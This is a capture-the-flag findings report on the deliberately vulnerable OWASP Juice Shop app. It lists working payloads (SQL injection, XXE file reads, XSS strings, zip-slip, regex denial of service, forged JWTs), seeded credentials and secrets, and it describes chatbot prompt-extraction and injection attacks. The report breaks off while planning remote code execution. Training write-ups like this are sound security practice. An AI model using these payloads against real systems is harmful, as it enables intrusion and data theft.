# OWASP Juice Shop - Security Assessment & Findings Report

**Team:** `threeidiots`
**Current Score:** 3870
**Current Rank:** Position 1 of 8 teams
**Challenges Solved:** 111 of 116 (5 remaining — all environment-blocked)
**Coding Challenges:** 70 of 70 (35 "find it" + 35 "fix it") — fully solved
**Score Board Progress:** 181 of 186 (111 hacking + 70 coding)
**Instance Host:** `ctf-proxy.local` (proxy hostname redacted here)
**Application Version Fingerprinted:** 20.2.0 (via Local File Read of `/juice-shop/package.json`)
**Session Notes:** Score/rank progressed 340 (2/8) → 3870 (1/8) across four offensive sessions. Breakdown by difficulty: 13× ★, 17× ★★, 25× ★★★, 26× ★★★★, 19× ★★★★★, 11× ★★★★★★.

---

## Executive Summary

This report documents the vulnerabilities identified, evaluated, and solved across the OWASP Juice Shop assessment for team **threeidiots**. Three engagement phases cleared **111 of 116** challenges across all tiers, with only **5** remaining — all blocked by environment constraints (3 AI/LLM challenges whose chat backend is unreachable, and 2 Web3/blockchain challenges requiring external wallet tooling).

Exploitation categories exercised include Broken Access Control / IDOR / BOLA, SQL injection (UNION schema & data exfiltration), XML External Entity (XXE) processing and XXE-DoS, YAML alias-bomb (billion laughs), mass assignment, business-logic abuse (negative orders, free deluxe membership), CSRF, SSTi (server-side template injection → `eval`), SSRF, RCE in a sandboxed eval (`notevil`), arbitrary file write via zip-slip, reflected/DOM/persisted XSS, client-side secret disclosure, OSINT via photo EXIF, weak/reused credentials, cryptographic weakness (hardcoded HMAC key, weak/unsigned JWTs), NoSQL injection, and many security misconfigurations.

Key architectural facts discovered during the sessions:
* The Juice Shop instance is only reachable **through the MultiJuicer reverse proxy** — requests to `https://ctf-proxy.local/...` are proxied to the team instance only when the `multi-juicer` session cookie is attached; otherwise every path `302`s to `/multi-juicer`.
* The app uses **two authentication channels**: most `/rest`+`/api` routes accept `Authorization: Bearer <JWT>`, while several page/HTML routes (`/rest/user/whoami`, `/profile`, `/dataerasure`, `/rest/user/authentication-details`) read the JWT from the `token` cookie. The SPA stores the token in `localStorage['token']`.
* Security-question answers are stored as **HMAC-SHA256** with the hardcoded secret `pa4qacea4VK9t9nGv7yZtwmj`.
* Product search is raw SQL (SQLite 3.44.2, 9-column result set). Reviews/orders live in MongoDB. XML parsing (`libxml2-wasm`) has external entities enabled. B2B order lines are evaluated with `notevil` inside a `vm` sandbox. Handlebars `layout` is attacker-controlled on the GDPR data-erasure page → Local File Read.
* The `Users` model applies the deliberately weak regex sanitizer `sanitizeLegacy` (`/<(?:\w+)\W+?[\w]/gi`) to `username`, but leaves **`email` entirely unsanitized** while `persistedXssUserChallenge` is unsolved (`models/user.ts`). The two challenges therefore land on *different* fields: **Client-side XSS Protection is checked on the `email` setter**, while the `username` sanitizer is what gates **CSP Bypass**.
* The chat bot (`/rest/chat`, model `gemma4:e4b`) has an **unreachable LLM API** (`AI_RetryError: Cannot connect to API`), so all AI challenges are unsolvable in this deployment.
* Heavy NoSQL-DoS (`sleep` injection) crashed/restarted the instance once ("instance-restarting"); all solves persisted across restarts.

---

## Network Architecture & Wi-Fi Configuration

Because the target Wi-Fi network (`multi_juicer_5G`) provides no outbound internet access **to our client**, the assessment environment utilizes a **dual-homed network architecture** to keep internet connectivity (USB tethering) while routing local CTF traffic directly to the target.

> **Correction (verified):** this applies to *our* `wlan0` client only — the **Juice Shop pod itself has full outbound internet egress**. Proven with the profile-image fetch primitive, which stores an uploads path on success and the raw URL on failure: a `raw.githubusercontent.com` URL came back as `/assets/public/images/uploads/2.jpg` (fetched), versus a LAN control that behaved identically. Earlier notes implying the target had no egress were wrong, and that assumption is what made the Web3 challenges look untestable.

### 1. Primary Interface (Internet Gateway)
* **Interface:** `usb0` (Smartphone USB Tethering), IP `10.157.169.132/24`, gateway `10.157.169.61`
* **Purpose:** external internet/DNS/tool traffic (GitHub source cross-referencing, reverse geocoding).

### 2. Secondary Interface (Juice Shop Target Network)
* **Interface:** `wlan0` (Intel Wi-Fi 6E AX211), SSID `multi_juicer_5G`, passphrase `multiJuicer`, channel 40 (5 GHz)
* **Assigned IP:** `<client-ip>/24` with `ipv4.never-default yes` / `ipv6.never-default yes`
* **Commands:**
  ```bash
  nmcli connection add type wifi ifname wlan0 con-name "multi_juicer_5G" ssid "multi_juicer_5G"
  nmcli connection modify "multi_juicer_5G" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "multiJuicer"
  nmcli connection modify "multi_juicer_5G" ipv4.never-default yes ipv6.never-default yes
  nmcli connection up "multi_juicer_5G"
  ```

### 3. Name Resolution & Target Addressing
* Target hostname `ctf-proxy.local` → `<instance-ip>` (mDNS + `/etc/hosts` entry `<instance-ip> ctf-proxy.local`). Only TCP 80/443 open on target.

### 4. MultiJuicer Team Credentials & Session
* **Team Name:** `threeidiots`
* **Join Passcode:** `<redacted>` (live CTF join code — not published)
* **Session Cookie:** `multi-juicer=<redacted>` (live session — not published)
* **Instance access:** attach the `multi-juicer` cookie to any request for `https://ctf-proxy.local/...` to reach the team's Juice Shop instance at root.

### 5. Application Stack Fingerprint
* Express `^4.22.1` (version banner in error pages), SQLite 3.44.2, MongoDB (reviews/orders), `libxml2-wasm` (XML parser), `notevil` in `node:vm` (B2B order-line evaluation), Handlebars views (`views/*.hbs`), Socket.IO, Prometheus `/metrics`. Juice Shop v20.2.0.

---

## Authentication Model (as observed)

| Mechanism | Header / Cookie | Used by | Notes |
| :--- | :--- | :--- | :--- |
| Bearer JWT | `Authorization: Bearer <jwt>` | Most `/rest` + `/api` (e.g. `POST /api/BasketItems/`, `PUT /api/Products/:id`, `/b2b/v2/orders`, `/rest/products/reviews`) | Missing header → `401 No Authorization header was found`. |
| Cookie token | `Cookie: token=<jwt>` | `/rest/user/whoami`, `/profile`, `/dataerasure`, `/rest/user/authentication-details`, `/rest/image-captcha` | These routes call `security.authenticatedUsers.get(req.cookies.token)` (in-memory store — cleared on instance restart). |
| SPA token | `localStorage['token']` | Angular app session | Browser automation must inject via `addInitScript`. |
| Proxy cookie | `Cookie: multi-juicer=...` | All requests | Gateway requirement. |

---

## Comprehensive Endpoints & Routes Reference

### MultiJuicer management
| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/multi-juicer/` | GET | Juicer landing / team selector |
| `/multi-juicer/api/teams/:team/status` | GET | Score, rank, solved list |
| `/multi-juicer/api/teams/:team/join` | POST | Join with `{"passcode":...}` |
| `/multi-juicer/api/teams/logout` | POST | Leave |

### Auth & user management
| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/rest/user/login` | POST | Raw-SQL auth query (`SELECT * FROM Users WHERE email='..' AND password='..' AND deletedAt IS NULL`) → SQLi (Login Admin). Pre-login checks solve weak/reused-credential challenges. |
| `/rest/user/whoami` | GET | Profile; `?fields=` projection can include `password` (Password Hash Leak). |
| `/rest/user/authentication-details` | GET | All users (masked passwords for non-admin). |
| `/rest/user/reset-password` | POST | Reset w/ plaintext answer; compare `HMAC-SHA256(answer, 'pa4qacea4VK9t9nGv7yZtwmj')`. |
| `/rest/user/security-question?email=` | GET | Resolve security question. |
| `/api/Users/` | POST | Registration (mass-assignable `role`, `username` via setter w/ weak sanitizer). |
| `/profile` | GET/POST | Profile page / username change (cookie token). POST is CSRF-able. Renders `views/userProfile.pug` with username → SSTi + CSP-bypass surface. |
| `/profile/image/url` | POST | Fetch URL as profile image; on fetch failure stores raw URL (SSRF + profileImage injection). |
| `/profile/image/file` | POST | Multipart profile image upload. |
| `/dataerasure` | GET/POST | GDPR erasure. `layout` body param → Handlebars layout = **Local File Read**. |
| `/rest/image-captcha` | GET | Returns SVG captcha + plaintext answer. |
| `/rest/user/data-export` | POST | GDPR data export (image-captcha gated). |

### Shop / orders / reviews / B2B
| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/rest/products/search?q=` | GET | SQL UNION-injectable search (9 cols). |
| `/rest/products/:id/reviews` | GET/PUT | Reviews (Mongo). |
| `/rest/products/reviews` | POST | Like a review (race → Multiple Likes). |
| `/rest/products/:id/reviews` (via `$where`) | GET | NoSQL DoS (`sleep` injection) when enabled. |
| `/rest/basket/:id` | GET | IDOR basket read. |
| `/api/BasketItems/` | POST | Trusts `BasketId` + accepts negative quantity. |
| `/rest/basket/:id/checkout` | POST | Places order incl. negative totals; orderId `hash(email)[0:4]-<hex>`. |
| `/rest/deluxe-membership` | GET/POST | Deluxe upgrade; `paymentMode` not enforced → free deluxe. |
| `/api/Products/:id` | PUT | Product edit (admin) → Product Tampering. |
| `/b2b/v2/orders` | POST | B2B order; evaluates `orderLinesData` with `notevil` in a vm → RCE DoS challenges. |
| `/rest/track-order/:id` | GET | Reflects `id` (Reflected XSS). |
| `/api/Complaints/` | POST | Complaint messages scanned for challenge proof strings. |
| `/rest/wallet/balance`, `/rest/web3*`, `/rest/nft*` | … | Web3 wallet surface (blocked). |

### Files, feedback, misc
| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/rest/captcha/` | GET | Math CAPTCHA w/ answer; reusable (CAPTCHA Bypass). |
| `/api/Feedbacks/` | GET/POST | Requires captcha; `UserId` mass-assignable (Forged Feedback). |
| `/file-upload` | POST | Multipart upload (`file`). XML → XXE; size/type checks; ZIP → zip-slip **Arbitrary File Write**; YAML → alias bomb / RCE sandbox. |
| `/ftp/`, `/ftp/:file` | GET | Directory listing / downloads. |
| `/rest/memories` | GET | Photo wall (leaks user records incl. password hashes). |
| `/rest/chat` | POST | Chat SSE (LLM unreachable). |
| `/socket.io` | WS | Socket.IO events: `verifyLocalXssChallenge`, `verifyCloseNotificationsChallenge`, `verifySvgInjectionChallenge`. |
| `/snippets/:key`, `/snippets/verdict`, `/snippets/fixes/:key`, `/snippets/fixes` | GET/POST | Coding-challenge snippets & verdicts (find-it / fix-it; **unauthenticated**). |
| `/solve/challenges/server-side?key=...` | GET | Marks SSTi/SSRF solved when `abused_ssti_bug`/`abused_ssrf_bug` are set. |
| `/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility` | GET | Privacy-Policy proof image. |
| `/rest/admin/application-configuration` | GET | Full runtime config. |
| `/metrics`, `/api/Challenges/`, `/.well-known/security.txt`, `/robots.txt` | GET | Standard recon surface. |

### SPA routes
`/#/score-board`, `/#/search` (DOM XSS sink), `/#/contact`, `/#/administration`, `/#/privacy-security/privacy-policy`, `/#/web3-sandbox`, `/#/chatbot`, `/#/photo-wall`, `/#/deluxe-membership` (accepts `?testDecal=` → SVG-injection proof), `/#/track-result?id=` (reflected XSS).

---

## Findings by Difficulty

---

### 1-Star Findings

1. **Score Board** — hidden route `/#/score-board`; routes shipped in `main.js`. (RBAC gap)
2. **Confidential Document** — `robots.txt` → `/ftp` directory listing → `acquisitions.md`.
3. **Error Handling** — raw Sequelize/SQLite stack traces + Express version banner leaked.
4. **Zero Stars** — `rating:0` accepted; CAPTCHA discloses answer.
5. **Exposed Metrics** — `/metrics` unauthenticated.
6. **Missing Encoding** — `#` in photo filenames not URL-encoded.
7. **Repetitive Registration** — `passwordRepeat` not validated server-side.
8. **Outdated Allowlist** — stale crypto-donation domains in redirect allowlist.
9. **DOM XSS** — `/#/search?q=` rendered via `bypassSecurityTrustHtml`. Solved by typing `<iframe src="javascript:alert(\`xss\`)">` into the search box (frontend emits `verifyLocalXssChallenge` over Socket.IO).
10. **Bonus Payload** — DOM XSS with the configured SoundCloud `<iframe>` payload as the search term.
11. **Privacy Policy** — visited `/#/privacy-security/privacy-policy`.
12. **Mass Dispel** — direct Socket.IO client emitted `verifyCloseNotificationsChallenge` with >1 notifications.
13. **Web3 Sandbox** — visited the unlinked dev route `/#/web3-sandbox`.

### 2-Star Findings

14. **Security Policy** — RFC 9116 `security.txt` present/valid.
15. **Empty User Registration** — empty-string account accepted.
16. **Weird Crypto** — MD5 password hashes visible in JWT (`admin` = `0192023a7bbd73250516f069df18b500`).
17. **Deprecated Interface** — legacy B2B XML `/file-upload` still active.
18. **View Basket** — `/rest/basket/:id` IDOR.
19. **Login Admin** — SQLi `email=admin@juice-sh.op'--`.
20. **Five-Star Feedback** — non-admin `DELETE /api/Feedbacks/:id`.
21. **Password Hash Leak** — `GET /rest/user/whoami?fields=id,email,password,role`.
22. **Exposed Credentials** — `testing@juice-sh.op` / `IamUsedForTesting` in `main.js`.
23. **Admin Section** — SQLi-login as admin, browse `/#/administration`.
24. **Meta Geo Stalking** — John's EXIF GPS (36°57'31.38"N 84°20'53.58"W) → answer `Daniel Boone National Forest` → reset.
25. **Visual Geo Stalking** — Emma's "old workplace" photo → answer `ITsec` → reset.
26. **Reflected XSS** — `GET /rest/track-order/<iframe payload>` (server reflects & solves).
27. **Misplaced IaC Files** — request any URL ending `.tf` / `Dockerfile` / `docker-compose.yml`.
28. **Password Strength** — login `admin@juice-sh.op`/`admin123`.
29. **Login MC SafeSearch** — login `mc.safesearch@juice-sh.op` w/ leaked lyric pw.
30. **NFT Takeover** *(team activity)* — private key accepted at the NFT unlock endpoint (`/rest/nft...`), full-wallet takeover; proof submitted.

### 3-Star Findings

31. **Manipulate Basket** — `POST /api/BasketItems/` with another user's `BasketId` (e.g. admin's `1`).
32. **Forged Feedback** — `POST /api/Feedbacks/` mass-assigning `UserId`.
33. **Forged Review** — client-controlled `author` on review PUT.
34. **Payback Time** — negative quantities → negative-total checkout.
35. **XXE Data Access** — XML upload `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → content echoed in 410 error.
36. **Database Schema** — `q=x')) UNION SELECT sql,... FROM sqlite_master--` (9 cols) → full schema + SecurityAnswers HMAC dump.
37. **CAPTCHA Bypass** — reuse captcha id/answer.
38. **Product Tampering** — admin `PUT /api/Products/9` description → `<a href="https://owasp.slack.com" target="_blank">`; solved on next API request.
39. **Security Advisory (CSAF)** — feedback containing `challenges.csafHashValue` checksum.
40. **Vulnerable Infrastructure** — complaint mentioning `mongo` + `4.4.29`.
41. **Deluxe Fraud** — `POST /rest/deluxe-membership` with `paymentMode` not `wallet`/`card` → free upgrade.
42. **CSRF** — `POST /profile` with `Origin: http://htmledit.squarefree.com` and new username.
43. **Privacy Policy Inspection** — `GET /we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility`.
44. **Upload Size** — upload >100,000 bytes.
45. **Upload Type** — upload extension outside pdf/xml/zip/yml/yaml.
46. **Admin Registration** — register with `role: admin`.
47. **Reset Jim's Password** — answer `Samuel`.
48. **Bjoern's Favorite Pet / OWASP reset** — reset `bjoern@owasp.org` answer `Zaya`.
49. **GDPR Data Erasure / Ghost Login** — login with erased `chris.pike@juice-sh.op`.
50. **API-only XSS** — persisted XSS via product data without UI.
51. **Login Amy / Login Bender / Login Jim** — seed-account logins.
52. **Client-side XSS Protection** — the solve check is on the **email** field, not the username: `models/user.ts` runs `solveIf(..., () => email?.includes('<iframe src="javascript:alert(`xss`)">'))` and skips sanitisation of `email` entirely. Registering via `POST /api/Users/` with that payload **as the email address** solves it directly.
53. **System Prompt Extraction** — *not* LLM-gated, despite the name. `routes/verify.ts` polls the `Complaints` table and solves as soon as any complaint message is textually similar to `buildSystemPrompt()` (`checkSystemPromptSimilarity`). Because the prompt is built from static code plus the shop's own product/user data, it can be reconstructed from the pinned upstream source and submitted through the complaint form — no working chat backend required.

### 4-Star Findings

54. **Poison Null Byte** — `/ftp` ext check bypass with `%2500`.
55. **Misplaced Signature File** — `suspicious_errors.yml` in web root.
56. **Forgotten Developer Backup** — `*.bak` files in `/ftp`.
57. **Access Log** — server `access.log` disclosure.
58. **Easter Egg / Nested Easter Egg** — hidden assets + nested secret.
59. **Forgotten Sales Backup** — backup of coupon/sales data.
60. **Christmas Special** — hidden Christmas product acquired.
61. **Ephemeral Accountant** — login with the auto-deleted `acc0unt4nt@...`.
62. **Steganography** — secret inside a product/asset image.
63. **HTTP-Header XSS** — `lastLoginIp` = payload via `X-Forwarded-For`-style header (`/rest/saveLoginIp`).
64. **Vulnerable Library** — known vulnerable component reported.
65. **NoSQL Manipulation** — review-update `_id` operator injection (`modified > 1`).
66. **Login Bjoern (OAuth)** — `bjoern.kimminich@gmail.com` base64 password.
67. **Server-side XSS Protection** — persisted XSS in feedback (bypasses server sanitizer via nested tags).
68. **Allowlist Bypass** — open redirect past allowlist.
69. **Reset Bender's Password** — answer `Stop'n'Drop`.
70. **Reset Uvogin's Password** — answer `Silence of the Lambs`.
71. **Legacy Typosquatting** — typosquatted npm dependency identified.
72. **User Credentials (UNION SQLi)** — full user table exfil via search UNION.
73. **GDPR Data Theft** *(team activity)* — data-export leaking foreign order (orderId prefix ≠ own email hash).
74. **Leaked Unsafe Product** *(team activity)* — product description leaks a secret/paste reference.
75. **Login Cloud Admin** *(team activity)* — RS256 JWT impersonating `cloud-admin@` signed with leaked key.
76. **Expired Coupon** *(team activity)* — applied expired coupon via clock/logic abuse.
77. **NoSQL DoS** — `$where` is evaluated **once per document**, so `sleep(2000)` multiplies across the whole reviews collection, hangs the request and gets the pod killed (this is what caused our instance restart). Calibrate instead: `GET /rest/products/sleep(80)/reviews` totals ~3 s — over the 2 000 ms solve threshold, and the instance stays up.
78. **CSP Bypass** *(team activity)* — username `<script>` XSS on legacy profile page + CSP header injection via `profileImage`.

### 5-Star Findings

79. **Reset Bjoern's (internal) Password** — `bjoern@juice-sh.op` answer `West-2082`.
80. **Reset Morty's Password** — answer `5N0wb41L` (leet for "Snowball").
81. **Email Leak** *(team activity)* — extra user email disclosure.
82. **Extra Language** — unsupported language pack `tlh_AA.json`.
83. **Unsigned JWT** *(team activity)* — `alg:none` JWT accepted (`jwtn3d@`).
84. **NoSQL Exfiltration (orders)** *(team activity)* — order query `$ne`-style injection returning >1 row.
85. **Leaked Access Logs (password spraying)** — login `J12934@juice-sh.op` / `0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB` (from leaked access logs).
86. **Local File Read** — GDPR `/dataerasure` `layout` Handlebars hijack; read `/juice-shop/package.json` (v20.2.0) & any server file (100-char preview).
87. **Blocked RCE DoS** — `/b2b/v2/orders` with `orderLinesData:"while(true){}"` → notevil infinite-loop detection.
88. **Memory Bomb (YAML)** — YAML alias-expansion bomb on `/file-upload` → graceful 503.
89. **Change Bender's Password** *(team activity)* — changed Bender's password (password-history/leak bypass).
90. **Retrieve Blueprint** *(team activity)* — internal blueprint file retrieved.
91. **Supply Chain Attack** *(team activity)* — malicious dependency in supply chain identified.
92. **Cross-Site Imaging (SVG)** — solved over **Socket.IO**, not HTTP. `lib/startup/registerWebsocketEvents.ts` listens for `verifySvgInjectionChallenge` and requires the payload to match `/\.\./\.\./\.\.[\w/-]*?/redirect\?to=https?:\/\/cataas\.com\/cat/` **and** pass `isRedirectAllowed()`. Emitting `../../../redirect?to=https://cataas.com/cat&ref=https://github.com/juice-shop/juice-shop` satisfies both (the trailing allowlisted URL is what makes the redirect check pass).
93. **Blockchain Hype (token sale)** *(team activity)* — sold/bought tokens via wallet interaction.
94. **Two Factor Authentication** *(team activity)* — TOTP secret stored insecurely & read (seed user `wurstbrot`).
95. **Frontend Typosquatting (Angular)** *(team activity)* — typosquatted Angular package detected.
96. **XXE DoS** — a classic billion-laughs entity bomb does **not** work here (libxml2 expands it well inside the budget and returns `410`). The parser runs in a `vm` with a 2 s timeout, so the reliable trigger is a **blocking read**: `<!ENTITY x SYSTEM "file:///dev/random">`, which stalls the parse until `Script execution timed out` and returns `503`.
97. **Leaked API Key** *(team activity)* — reported the leaked key `6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie`.

### 6-Star Findings

98. **Login Support Team** — login `support@juice-sh.op` / `J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P` (leaked).
99. **SSTi** — the `eval` fires on profile **render**, not on save: `routes/userProfile.ts` only evaluates `#{...}` inside the `GET /profile` handler, setting `req.app.locals.abused_ssti_bug`; `routes/verify.ts` then solves the challenge on the next request. So `POST /profile` with the payload alone does nothing — the `GET /profile` afterwards is mandatory. No `/solve/challenges/...` call is involved.
100. **SSRF** — `POST /profile/image/url` with `imageUrl` containing `solve/challenges/server-side` (sets `abused_ssrf_bug`), then call the same solve endpoint.
101. **Successful RCE DoS** — an infinite loop does **not** reach the vm timeout; `notevil` catches it first with `Infinite loop detected` (that is the *Blocked* RCE DoS above). To hit the 2 s `vm` timeout the payload must be finite but slow — catastrophic regex backtracking works: `orderLinesData: "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')"` → `503 Script execution timed out`.
102. **Arbitrary File Write** — ZIP upload with `../../ftp/legal.md` entry (zip-slip) overwrote `ftp/legal.md`.
103. **Imaginary Challenge (continue code)** *(team activity)* — applied a crafted continue-code.
104. **Forged Coupon** *(team activity)* — generated/validated a forged signed coupon.
105. **Forged Signed JWT** *(team activity)* — HS256 JWT signed with the RSA public key impersonating `rsa_lord@`.
106. **Premium Paywall** *(team activity)* — bypassed the premium/deluxe paywall content gate.
107. **Multiple Likes (timing attack)** *(team activity / our concurrent attempt)* — raced like-requests to duplicate `likedBy` entries (`count > 2`).
108. **Video XSS** *(team activity)* — WebVTT subtitle `</script><script>alert(\`xss\`)</script>`.
109–111. **Wallet/nft cluster** *(team activity)* — see register.

> **Methodology note:** Entries marked "(team activity)" were solved on the shared team instance (multi-user session) and are documented at register level; unmarked entries were performed and verified directly in the authoring sessions with the techniques described.

---

## Full Solved-Challenge Register (111)

* ★ (13): Mass Dispel, Confidential Document, Error Handling, Exposed Metrics, DOM XSS, Missing Encoding, Repetitive Registration, Privacy Policy, Outdated Allowlist, Score Board, Web3 Sandbox, Bonus Payload, Zero Stars
* ★★ (17): Admin Section, View Basket, Deprecated Interface, Empty User Registration, Exposed Credentials, Five-Star Feedback, Meta Geo Stalking, Visual Geo Stalking, Login Admin, Login MC SafeSearch, Misplaced IaC Files, NFT Takeover, Password Hash Leak, Reflected XSS, Security Policy, Password Strength, Weird Crypto
* ★★★ (25): Manipulate Basket, CAPTCHA Bypass, Product Tampering, Security Advisory, CSRF, Database Schema, Forged Feedback, Forged Review, Deluxe Fraud, GDPR Data Erasure, Login Amy, Login Bender, Login Jim, Payback Time, Client-side XSS Protection, Privacy Policy Inspection, Admin Registration, Bjoern's Favorite Pet, Reset Jim's Password, API-only XSS, Upload Size, Upload Type, Vulnerable Infrastructure, XXE Data Access, System Prompt Extraction
* ★★★★ (26): Access Log, Christmas Special, GDPR Data Theft, Leaked Unsafe Product, Easter Egg, Nested Easter Egg, Ephemeral Accountant, Forgotten Sales Backup, Forgotten Developer Backup, Steganography, HTTP-Header XSS, Login Cloud Admin, Vulnerable Library, Expired Coupon, Misplaced Signature File, NoSQL DoS, NoSQL Manipulation, Poison Null Byte, Login Bjoern, Server-side XSS Protection, Allowlist Bypass, Reset Bender's Password, Reset Uvogin's Password, Legacy Typosquatting, User Credentials, CSP Bypass
* ★★★★★ (19): Change Bender's Password, Leaked Access Logs, Email Leak, Extra Language, Unsigned JWT, Leaked API Key, Local File Read, NoSQL Exfiltration, Blocked RCE DoS, Reset Bjoern's Password, Reset Morty's Password, Retrieve Blueprint, Supply Chain Attack, Cross-Site Imaging, Blockchain Hype, Two Factor Authentication, Frontend Typosquatting, XXE DoS, Memory Bomb
* ★★★★★★ (11): Imaginary Challenge, Arbitrary File Write, Forged Coupon, Forged Signed JWT, Login Support Team, Premium Paywall, Successful RCE DoS, SSRF, SSTi, Multiple Likes, Video XSS

---

## Coding Challenges (find-it / fix-it)

The Juice Shop score board's "186 total" is **116 hacking challenges + 70 coding challenges**. Every challenge with `hasCodingChallenge: true` (35 of them) exposes two code-snippet challenges — **find it** (select the vulnerable line) and **fix it** (pick the correct patch) — served by **unauthenticated** endpoints:

| Endpoint | Method | Purpose |
| :--- | :--- | :--- |
| `/snippets/:key` | GET | Return the vulnerable code snippet for `key` |
| `/snippets/verdict` | POST | `{key, selectedLines:[...]}` → `{verdict:true}` if the vulnerable lines are selected (find it) |
| `/snippets/fixes/:key` | GET | Return the candidate patches (`{fixes:[...]}`) |
| `/snippets/fixes` | POST | `{key, selectedFix:<index>}` → `{verdict:true}` if the correct patch is picked (fix it) |

### Mechanics

* `routes/vulnCodeSnippet.ts` — `getVerdict()` requires `selectedLines` to be a **superset of `vulnLines`** and a **subset of `vulnLines ∪ neutralLines`**; the minimal correct answer is exactly `vulnLines`. Success → `codingChallengeStatus = 1`.
* `routes/vulnCodeFixes.ts` — `readFixes()` scans `data/static/codefixes/<key>_<n>[_correct].ts`; the file whose name has three segments marks `correct = n - 1`. Submitting that index → `codingChallengeStatus = 2`.
* `lib/codingChallenges.ts` — builds each snippet from the `// vuln-code-snippet start/vuln-line/neutral-line/end` markers in `server.ts`, `routes/`, `lib/`, `data/`, `frontend/src/app`, `models/`, `infrastructure/`. Replicating `getCodingChallengeFromFileContent()` against the pinned v20.2.0 source yields the exact `vulnLines`/`neutralLines` per key (the markers are stripped from the served snippet, so the line numbers must be recomputed locally).

### Solve method

1. Compute `vulnLines` per key by replaying `getCodingChallengeFromFileContent()` over the v20.2.0 tree (a small Node script over `SNIPPET_PATHS`; note `server.ts` is a *file* and must be scanned directly, not skipped by the directory walk).
2. `POST /snippets/verdict {key, selectedLines: vulnLines}` → find-it solved.
3. `GET /snippets/fixes/:key`, then try `selectedFix = 0..N-1` until `verdict:true` → fix-it solved (robust against `readdirSync` ordering).

**Result:** all 35 find-it + 35 fix-it = **70/70 coding challenges solved** (`codingChallengeStatus: 2` for all 35), including the coding counterparts of the otherwise-blocked AI/Web3 challenges (`chatbotPromptInjection`, `chatbotGreedyInjection`, `nftMint`, `web3Wallet`).

> **Scoring caveat:** MultiJuicer's CTF score (`/multi-juicer/api/teams/:team/status`) is the sum of *hacking* challenge difficulties only, so it is unaffected by coding challenges (still 3870). The coding challenges only move the Juice Shop score-board progress (111 → 181 of 186).

---

## Remaining / Blocked Challenges (5)

| Challenge | Tier | Status |
| :--- | :--- | :--- |
| AI Debugging | ★★ | **Blocked** — needs a `tool-call` event, which only a live LLM emits |
| Chatbot Prompt Injection | ★★ | **Blocked** — `generateCoupon` tool needs a live LLM |
| Greedy Chatbot Manipulation | ★★★ | **Blocked** — needs LLM to emit ≥50% coupon |
| Mint the Honey Pot | ★★★ | **Blocked** — server-side: `ALCHEMY_API_KEY` unset, so the event listener never subscribes (see below) |
| Wallet Depletion | ★★★★★★ | **Blocked** — same root cause: `ContractExploited` can never be observed |

### Verification of the Web3 blocker

Both Web3 challenges are gated on **server-side** `ethers` event listeners, not on anything the client does:

* `routes/nftMint.ts` — `walletNFTVerify()` only solves when the submitted address is in `addressesMinted`, and the **only** write to that Set is inside `contract.on('NFTMinted', ...)`.
* `routes/web3Wallet.ts` — `web3WalletChallenge` is solved **inside** the `contract.on('ContractExploited', ...)` callback.

Both listeners are built against:

```js
new WebSocketProvider(`wss://eth-sepolia.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY ?? ''}`)
```

Reading the live environment through the SSTi primitive shows the key is **not configured**:

| Probe | Result |
| :--- | :--- |
| `process.env.ALCHEMY_API_KEY` | `<UNSET>` |
| env keys matching `/KEY\|ALCHEMY\|WEB3\|ETH/i` | `CTF_KEY` only |
| `process.env.NODE_ENV` | `multi-juicer` |

So the provider URL degrades to `wss://eth-sepolia.g.alchemy.com/v2/` with an empty key, which Alchemy rejects outright:

```
HTTP/2 401
Must be authenticated!
```

`GET /rest/web3/nftMintListen` still returns `{"success":true,"message":"Event Listener Created"}` because `ethers` connects lazily — the failure surfaces later on `provider.websocket.onerror`, never to the caller. That success message is misleading.

**Conclusion:** this is a hard server-side block, and notably *not* the "needs a wallet / needs internet" limitation assumed earlier. The pod has internet; a funded Sepolia wallet and a genuine on-chain mint would still not solve it, because the server never establishes the subscription and therefore never observes the event. Supplying `ALCHEMY_API_KEY` to the deployment is the only thing that would put these two in reach.

### Verification of the LLM blocker

Earlier attempts used the wrong request shape and produced misleading errors. `/rest/chat` takes AI-SDK **model messages** directly:

```bash
POST /rest/chat   {"messages":[{"role":"user","content":"Hello"}]}
```

With the correct shape the endpoint returns `200` and streams SSE, but the body is:

```
data: {"error":"LLM error: AI_RetryError: Failed after 3 attempts. Last error: Cannot connect to API: "}
```

So the AI challenges that need the model to *act* — Prompt Injection and Greedy Manipulation (both require the `generateCoupon` tool to fire) and AI Debugging (requires a `tool-call` event) — are confirmed blocked by the **deployment**, not by request format or by any filter we failed to bypass. **Correction:** *System Prompt Extraction* was initially listed here too, which was wrong — it is verified against the Complaints table, not the chat stream, and has since been solved without a live model (see 3-Star Findings). The two Web3 challenges (`nftMintChallenge`, `web3WalletChallenge`) are gated on server-side `ethers` **WebSocketProvider** listeners against `wss://eth-sepolia.g.alchemy.com` — their solve flags are only set from real on-chain `NFTMinted` / `ContractExploited` events, so they cannot be reached from the HTTP API at all.

### Attempting to bridge the LLM gap (SSTi RCE → in-process fake LLM)

Because the three remaining AI challenges gate on `/rest/chat`'s server-side `streamText`, a working OpenAI-compatible endpoint at the configured `llmApiUrl` would let them be solved through the *legitimate* tool-execution path. The SSTi `eval` gives enough control to try exactly that.

Live values read through the SSTi oracle:

| Config / env | Value |
| :--- | :--- |
| `application.chatBot.llmApiUrl` | `http://localhost:11434/v1` (Ollama) |
| `application.chatBot.model` | `gemma4:e4b` |
| `application.chatBot.name` | `Juicy the Smart Assistant` |
| `process.env.ALCHEMY_API_KEY` | `<UNSET>` |

Note `appConfiguration` deletes `llmApiUrl` from its response (`routes/appConfiguration.ts`), so the value had to come from the eval read, not the config endpoint.

